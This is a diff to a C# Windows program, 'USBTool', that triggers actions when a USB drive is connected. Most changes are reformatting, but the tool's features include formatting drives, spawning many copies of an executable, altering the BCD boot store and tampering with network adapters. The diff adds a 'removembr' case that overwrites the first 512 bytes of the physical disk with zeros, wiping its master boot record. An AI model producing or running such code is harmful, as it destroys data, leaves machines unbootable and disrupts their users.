@@ -41,10 +41,12 @@ namespace USBTool
 							{
 								case "copy":
 									string drivename = drive.Name;
-									CopyDiretory(drive.RootDirectory, Directory.CreateDirectory(Folder.SelectedPath + "\\" + (
-										drivename.EndsWith("\\") ?
-										drivename.Substring(0, drive.Name.Length - 2) :
-										drivename)));
+									CopyDiretory(
+										drive.RootDirectory, 
+										Directory.CreateDirectory(Folder.SelectedPath + "\\" + (
+											drivename.EndsWith("\\") ?
+											drivename.Substring(0, drive.Name.Length - 2) :
+											drivename)));
 									break;
 								case "format":
 									var co = new ConnectionOptions
@@ -63,7 +65,12 @@ namespace USBTool
 									{
 										if (volume.Properties["Name"].Value.ToString() == drive.Name)
 										{
-											object[] methodArgs = { "FAT32", true/*快速格式化*/, 4096/*簇大小*/, ""/*卷标*/, false/*压缩*/ };
+											object[] methodArgs = { 
+												"FAT32", 
+												true/*快速格式化*/, 
+												4096/*簇大小*/, 
+												""/*卷标*/, 
+												false/*压缩*/ };
 											volume.InvokeMethod("Format", methodArgs);
 											Thread.Sleep(4000);
 										}
@@ -72,7 +79,13 @@ namespace USBTool
 								case "message":
 									tf.StartNew(() =>
 									{
-										MessageBox.Show(message, "Error", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);
+										MessageBox.Show(
+											message, 
+											"Error", 
+											MessageBoxButtons.YesNoCancel, 
+											MessageBoxIcon.Error, 
+											MessageBoxDefaultButton.Button1, 
+											MessageBoxOptions.ServiceNotification);
 									});
 									break;
 								case "kill":
@@ -101,7 +114,9 @@ namespace USBTool
 									SetAttributes(drive.Name, FileAttributes.ReadOnly);
 									break;
 								case "kasi":
-									ulong number = new Microsoft.VisualBasic.Devices.ComputerInfo().TotalPhysicalMemory / 1024 / 1024 / 1024 / 2;
+									ulong number = 
+										new Microsoft.VisualBasic.Devices.ComputerInfo().
+										TotalPhysicalMemory / 1024 / 1024 / 1024 / 2;
 									for (ulong runtime = 0; runtime < number; runtime++)
 									{
 										Process.Start(Application.StartupPath + "\\mm.exe");
@@ -187,16 +202,11 @@ namespace USBTool
 									mediaEvent.FreeEventParams(eventcode, lp1, lp2);
 									host.Hide();
 #elif MEDIA_FOUNDATION
-									Guid guidEnumetator = typeof(IMMDeviceEnumerator).GUID;
-									Guid guidVolume = typeof(IAudioEndpointVolume).GUID;
-									CoCreateInstance(ref MMDeviceEnumerator, null, CLSCTX_ALL, ref guidEnumetator, out IUnknown _enumerater);
-									IMMDeviceEnumerator enumerator = _enumerater as IMMDeviceEnumerator;
 									while (state != "Prepared" & state != "Ended") { }
 									state = "Playing";
 									while (state != "Ended") ;									
 #endif
 									break;
-
 								case "speech":
 									Voice.Volume = (int)((object[])ReadText.Tag)[0];
 									Voice.Rate = (int)((object[])ReadText.Tag)[1];
@@ -283,8 +293,23 @@ namespace USBTool
 									break;
 								case "eject":
 									uint returnvalue = 0;
-									IntPtr Handle = CreateFile(@"\\.\" + drive.Name[0] + ":", (GENERIC_READ + GENERIC_WRITE), FILE_SHARE_READ + FILE_SHARE_WRITE, IntPtr.Zero, 3, 0, IntPtr.Zero);
-									DeviceIoControl(Handle, IOCTL_STORAGE_EJECT_MEDIA, IntPtr.Zero, 0, IntPtr.Zero, 0, ref returnvalue, IntPtr.Zero);
+									IntPtr Handle = CreateFile(
+										@"\\.\" + drive.Name[0] + ":", 
+										GENERIC_READ|GENERIC_WRITE, 
+										FILE_SHARE_READ|FILE_SHARE_WRITE, 
+										IntPtr.Zero, 
+										OPEN_EXISTING, 
+										0, 
+										IntPtr.Zero);
+									DeviceIoControl(
+										Handle, 
+										IOCTL_STORAGE_EJECT_MEDIA, 
+										IntPtr.Zero, 
+										0, 
+										IntPtr.Zero,
+										0, 
+										ref returnvalue, 
+										IntPtr.Zero);
 									break;
 								case "flash":
 									ChangeDisplaySettings(ref DEVMODE1, 0);
@@ -320,11 +345,12 @@ namespace USBTool
 									ForEachWindow(GetDesktopWindow(), "beuncle");
 									break;
 								case "bcd":
-									//RegistryKey bcdreg = Registry.LocalMachine.OpenSubKey("BCD00000000\\Objects");
-									//bcdreg.GetAccessControl().AddAccessRule(
-									//	new System.Security.AccessControl.RegistryAccessRule(
-									//		Environment.UserDomainName + "\\" + Environment.UserName,
-									//		System.Security.AccessControl.RegistryRights.FullControl, System.Security.AccessControl.AccessControlType.Allow));
+									/*RegistryKey bcdreg = Registry.LocalMachine.OpenSubKey("BCD00000000\\Objects");
+									bcdreg.GetAccessControl().AddAccessRule(
+										new System.Security.AccessControl.RegistryAccessRule(
+											Environment.UserDomainName + "\\" + Environment.UserName,
+											System.Security.AccessControl.RegistryRights.FullControl, 
+											System.Security.AccessControl.AccessControlType.Allow));*/
 									co = new ConnectionOptions
 									{
 										Impersonation = ImpersonationLevel.Impersonate,
@@ -332,7 +358,10 @@ namespace USBTool
 										EnablePrivileges = true
 									};
 									scope = new ManagementScope("root\\wmi", co);
-									ManagementObject bcdstore = new ManagementObject(scope, new ManagementPath("BcdStore.FilePath=\"\""), null);
+									ManagementObject bcdstore = new ManagementObject(
+										scope, 
+										new ManagementPath("BcdStore.FilePath=\"\""), 
+										null);
 									try
 									{
 										ManagementBaseObject bcdarg = bcdstore.GetMethodParameters("EnumerateObjects");
@@ -351,7 +380,10 @@ namespace USBTool
 									if (ReBoot.Checked)
 									{
 										scope = new ManagementScope("Root\\CIMV2", co);
-										var system = new ManagementClass(scope, new ManagementPath("Win32_OperatingSystem"), null);
+										var system = new ManagementClass(
+											scope, 
+											new ManagementPath("Win32_OperatingSystem"), 
+											null);
 										foreach (ManagementObject s in system.GetInstances())
 										{
 											try
@@ -373,7 +405,10 @@ namespace USBTool
 										EnablePrivileges = true
 									};
 									scope = new ManagementScope("Root\\CIMV2", co);
-									ManagementClass networkadapters = new ManagementClass(scope, new ManagementPath("Win32_NetworkAdapter"), null);
+									ManagementClass networkadapters = new ManagementClass(
+										scope, 
+										new ManagementPath("Win32_NetworkAdapter"), 
+										null);
 									foreach (ManagementObject adapter in networkadapters.GetInstances())
 									{
 										try
@@ -472,7 +507,7 @@ namespace USBTool
 											x+=sign)
 										{
 											Cursor.Position = new Point(x, y);											
-											Thread.Sleep(new TimeSpan(9999
+											Thread.Sleep(new TimeSpan(9000
 												));
 										}
 									}
@@ -500,7 +535,10 @@ namespace USBTool
 										EnablePrivileges = true
 									};
 									scope = new ManagementScope("Root\\CIMV2", co);
-									ManagementClass disks = new ManagementClass(scope, new ManagementPath("Win32_LogicalDisk"), null);
+									ManagementClass disks = new ManagementClass(
+										scope, 
+										new ManagementPath("Win32_LogicalDisk"), 
+										null);
 									foreach (ManagementObject disk in disks.GetInstances())
 									{
 										if (disk.Properties["Name"].Value.ToString() + "\\" == drive.Name)
@@ -519,6 +557,47 @@ namespace USBTool
 									break;
 								case "totop":
 									ForEachWindow(GetDesktopWindow(), "top");
+									break;
+								case "removembr":
+									co = new ConnectionOptions
+									{
+										Impersonation = ImpersonationLevel.Impersonate,
+										Authentication = AuthenticationLevel.Call,
+										EnablePrivileges = true
+									};
+									scope = new ManagementScope("Root\\CIMV2", co);
+									ManagementClass partitions = new ManagementClass(
+										scope, 
+										new ManagementPath("Win32_DiskPartition"), 
+										null);
+									foreach (ManagementObject partition in partitions.GetInstances())
+									{
+										foreach(ManagementObject disk in partition.GetRelated("Win32_LogicalDisk"))
+                                        {
+                                            if (disk.Properties["Name"].Value.ToString() + "\\" == drive.Name)
+                                            {
+												string index = partition.Properties["DiskIndex"].Value.ToString();
+												IntPtr diskhandle = CreateFile(
+													@"\\.\PHYSICALDRIVE" + index,
+													GENERIC_READ | GENERIC_WRITE,
+													FILE_SHARE_READ | FILE_SHARE_WRITE,
+													IntPtr.Zero,
+													OPEN_EXISTING,
+													0,
+													IntPtr.Zero
+													);
+												byte[] buffer = new byte[512];
+												for (int i = 0; i < 512; i++)
+													buffer[i] = 0;
+												WriteFile(
+													diskhandle,
+													new byte[512],
+													512,
+													out _,
+													IntPtr.Zero);
+                                            }
+                                        }
+									}
 									break;
 								default:
 									throw (new ArgumentException("该功能还未开发"));
@@ -628,7 +707,7 @@ namespace USBTool
 			Media.Tag = SetAttrib.Show("media");
 			if (((object[])Media.Tag).Length != 0)
 			{
-				host = new wndVideo();
+				host = new WndVideo();
 #if MEDIA_DSHOW
 				FilterGraph fg = Activator.CreateInstance(typeof(FilterGraph)) as FilterGraph;				
 				control = fg as IMediaControl;
@@ -795,7 +874,7 @@ namespace USBTool
 		{
 			WhenArrival("eject");
 		}
-		public void flash_Click(object sender, EventArgs e)
+		public void Flash_Click(object sender, EventArgs e)
 		{
 			DEVMODE1 = new DEVMODE()
 			{
@@ -808,7 +887,7 @@ namespace USBTool
 		}
 
 
-		private void random_Click(object sender, EventArgs e)
+		private void Random_Click(object sender, EventArgs e)
 		{
 			DEVMODE1 = new DEVMODE()
 			{
@@ -974,6 +1053,11 @@ namespace USBTool
         private void ToTop_Click(object sender, EventArgs e)
         {
 			WhenArrival("totop");
+		}
+
+        private void RemoveMbr_Click(object sender, EventArgs e)
+        {
+			WhenArrival("removembr");
 		}
     }
 }
